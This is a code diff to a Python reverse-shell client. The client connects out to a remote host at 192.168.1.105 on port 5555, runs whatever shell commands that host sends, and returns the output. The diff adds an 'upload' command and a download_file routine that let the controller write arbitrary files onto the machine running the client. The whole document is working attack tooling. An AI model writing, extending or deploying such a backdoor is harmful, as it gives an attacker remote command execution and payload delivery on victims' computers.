@@ -17,6 +17,19 @@ def recv_data():
 		except ValueError:
 			continue
 
+def download_file(file_name): 
+	f = open(file_name, 'wb') # create a new file in write mode.
+	s.settimeout(1)
+	chunk = s.recv(1024) # We receive the file as chunks of 1024 bytes
+	while True: # Define an infinite loop
+		f.write(chunk) # write the recieved chunks to the file.
+		try:
+			chunk = s.recv(1024) # we'll continue to receive the file until there is nothing more to recieve. Here the program hangs.
+		except socket.timeout as e: # Here we exit out of the infinite loop as wet set timeout to 1 earlier.
+			break
+	s.settimeout(None)
+	f.close()
+
 def shell():
 	while True:
 		command = recv_data()
@@ -31,6 +44,8 @@ def shell():
 				os.chdir(command[3:])
 			except FileNotFoundError:
 				pass
+		elif command[:6] == "upload":
+			download_file(command[7:])
 		else:
 			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			result = execute.stdout.read() + execute.stderr.read()
@@ -39,5 +54,5 @@ def shell():
 
 if __name__ == "__main__":
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("127.0.0.1", 5555))
+	s.connect(("192.168.1.105", 5555))
 	shell()
